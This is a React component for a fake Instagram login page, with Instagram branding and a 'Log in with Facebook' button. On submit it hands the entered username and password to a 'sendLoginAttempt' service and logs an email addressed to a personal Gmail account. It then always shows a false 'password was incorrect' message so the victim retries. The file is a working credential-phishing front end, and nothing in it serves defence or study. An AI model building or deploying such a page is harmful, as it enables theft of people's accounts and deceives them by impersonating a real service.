
import React, { useState } from 'react';
import { FacebookIcon, InstagramLogo } from './icons';
import { sendLoginAttempt } from '../services/geminiService';

const LoginForm: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const canSubmit = username.length > 0 && password.length > 0 && !isLoading;

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!canSubmit) return;

    setIsLoading(true);
    setError('');

    try {
      const emailBody = await sendLoginAttempt(username, password);
      console.log("--- SIMULATED EMAIL SENT ---");
      console.log("To: shawnmendoza42069@gmail.com");
      console.log(emailBody);
      // Per instructions, always show an error after an attempt.
    } catch (apiError) {
      console.error("Failed to generate email content via Gemini API:", apiError);
    } finally {
      setIsLoading(false);
      setError('Sorry, your password was incorrect. Please double-check your password.');
      setPassword(''); // Clear password field on failed attempt
    }
  };

  return (
    <div className="p-10 flex flex-col items-center">
      <div className="w-48 mb-8">
        <InstagramLogo />
      </div>
      <form onSubmit={handleSubmit} className="w-full flex flex-col space-y-2">
        <input
          type="text"
          placeholder="Phone number, username, or email"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="bg-gray-50 border border-gray-300 rounded-sm px-2 py-2 text-xs focus:outline-none focus:border-gray-400"
          aria-label="Phone number, username, or email"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="bg-gray-50 border border-gray-300 rounded-sm px-2 py-2 text-xs focus:outline-none focus:border-gray-400"
          aria-label="Password"
        />
        <button
          type="submit"
          disabled={!canSubmit}
          className={`w-full text-white font-semibold rounded py-1.5 mt-2 text-sm ${
            canSubmit ? 'bg-blue-500 hover:bg-blue-600' : 'bg-blue-300 cursor-not-allowed'
          }`}
        >
          {isLoading ? 'Logging in...' : 'Log in'}
        </button>
      </form>
      
      {error && <p className="text-red-500 text-sm text-center mt-4">{error}</p>}

      <div className="flex items-center w-full my-6">
        <div className="flex-grow h-px bg-gray-300"></div>
        <span className="px-4 text-xs font-semibold text-gray-400">OR</span>
        <div className="flex-grow h-px bg-gray-300"></div>
      </div>

      <button className="flex items-center justify-center font-semibold text-sm text-blue-900">
        <FacebookIcon />
        <span className="ml-2">Log in with Facebook</span>
      </button>

      <a href="#" className="text-xs text-blue-900 mt-6 hover:underline">
        Forgot password?
      </a>
    </div>
  );
};

export default LoginForm;
